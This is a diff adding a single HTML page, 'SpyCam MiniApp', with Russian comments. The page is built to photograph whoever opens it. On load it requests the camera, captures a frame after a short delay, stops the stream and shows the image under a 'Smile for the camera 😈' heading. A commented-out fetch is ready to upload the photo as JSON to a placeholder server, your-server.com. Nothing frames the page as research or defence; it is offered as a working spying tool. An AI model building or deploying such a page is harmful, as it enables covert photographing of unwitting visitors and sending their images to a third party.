@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SpyCam MiniApp</title>
+  <style>
+    body { margin: 0; font-family: sans-serif; text-align: center; background: #111; color: white; }
+    video, canvas, img { max-width: 100%; margin-top: 10px; }
+    #video { display: block; }
+  </style>
+</head>
+<body>
+  <h2>Smile for the camera 😈</h2>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+  <img id="photo" alt="Captured image will appear here">
+
+  <script>
+    async function capture() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        await new Promise(resolve => video.onloadedmetadata = resolve);
+
+        // Немного подождём, чтобы камера точно успела включиться
+        await new Promise(res => setTimeout(res, 700));
+
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        // Останавливаем камеру
+        stream.getTracks().forEach(track => track.stop());
+
+        // Показываем фото
+        const photo = document.getElementById('photo');
+        photo.src = canvas.toDataURL('image/png');
+
+        // Убираем видео
+        video.style.display = 'none';
+
+        // Если нужно отправить фото:
+        /*
+        fetch('https://your-server.com/upload', {
+          method: 'POST',
+          body: JSON.stringify({ image: photo.src }),
+          headers: { 'Content-Type': 'application/json' }
+        });
+        */
+
+      } catch (err) {
+        document.body.innerHTML = '<h2>❌ Камера недоступна</h2>';
+        console.error(err);
+      }
+    }
+
+    window.onload = capture;
+  </script>
+</body>
+</html>
